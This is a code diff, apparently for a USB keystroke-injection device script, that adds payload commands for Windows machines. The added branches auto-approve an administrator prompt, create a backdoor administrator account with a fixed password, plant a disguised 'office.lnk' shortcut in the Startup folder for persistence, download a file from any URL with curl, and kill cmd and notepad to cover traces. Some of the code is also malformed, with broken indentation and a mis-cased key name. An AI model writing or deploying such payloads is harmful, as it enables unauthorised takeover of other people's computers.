@@ -108,6 +108,53 @@ def execute_command(function, command):
             press_combination(Keycode.CONTROL, Keycode.S)
             time.sleep(2)
             press_combination(Keycode.ALT, Keycode.F4)
+        elif function == "CLEANUP":
+        press_combination(Keycode.WINDOWS, Keycode.R)
+        time.sleep(1)
+        layout.write("taskkill /F /IM cmd.exe")
+        time.sleep(1)
+        press_combination(Keycode.WINDOWS, Keycode.R)
+        time.sleep(1)
+        layout.write("taskkill /F /IM notepad.exe")
+        press_combination(Keycode.ENTER)
+    elif function == "SHORTCUT":
+        paths, pathc = command.split('+', 1)
+        runcmd()
+        if "Startup" in paths:
+            paths = "'office.lnk'"
+            pathc = "'" + pathc + "'"
+            layout.write(r"cd AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+            press_combination(Keycode.ENTER)            
+            layout.write(f'powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut({paths}); $s.TargetPath={pathc}; $s.Save()"')
+            press_combination(Keycode.ENTER)
+    elif function == "CMDA":
+        runcmd()
+        time.sleep(1)
+        layout.write("powershell Start-Process cmd -Verb RunAs")
+        press_combination(Keycode.ENTER) 
+        time.sleep(5)
+        press_combination(Keycode.LEFT_ARROW)
+        press_combination(Keycode.ENTER)
+    elif function == "USERA":
+        runcmd()
+        time.sleep(1)
+        layout.write("powershell Start-Process cmd -Verb RunAs")
+        press_combination(Keycode.ENTER) 
+        time.sleep(3)
+        press_combination(Keycode.LEFT_ARROW)
+        press_combination(Keycode.ENTER)
+        time.sleep(1)
+        layout.write("net user muan Admin1234 /add && net localgroup administrators muan /add")
+        press_combination(Keycode.ALT, Keycode.F4)
+    elif function == "curl":
+        pathc = "C:\temp"
+        url, pathc = command.split('+', 1)
+        runcmd()
+        layout.write("MD C:\Temp")
+        press_combination(Keycode.ENTER)
+        curlc = f'curl -o "{pathc}" "{url}"'
+        layout.write(curlc)
+        press_combination(Keycode.Enter)
     
 
 def get_substr(string, start, end):
